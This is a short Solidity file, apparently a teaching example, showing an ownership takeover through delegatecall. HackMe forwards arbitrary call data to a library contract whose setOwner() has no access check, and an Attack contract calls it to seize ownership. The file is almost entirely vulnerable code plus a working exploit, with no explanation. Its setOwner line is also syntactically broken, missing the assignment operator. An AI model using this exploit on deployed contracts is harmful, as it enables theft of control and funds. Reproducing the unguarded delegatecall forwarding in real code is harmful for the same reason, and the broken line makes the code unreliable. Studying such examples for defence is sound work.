// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Libre {
    address public owner;
    
    function setOwner() public {
        owner msg.sender;
    }
}

contract HackMe {
    address public owner;
    Libre public libre;
    
    constructor(Libre _libre) {
        owner = msg.sender;
        libre = Libre(_libre);
    }
    
    fallback() external payable {
        address(libre).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;
    
    constructor(address _hackMe) {
        hackMe = _hackMe;
    }
    
    function attack() public {
        hackMe.call(abi.encodeWithSignature("setOwner()"));
    }
}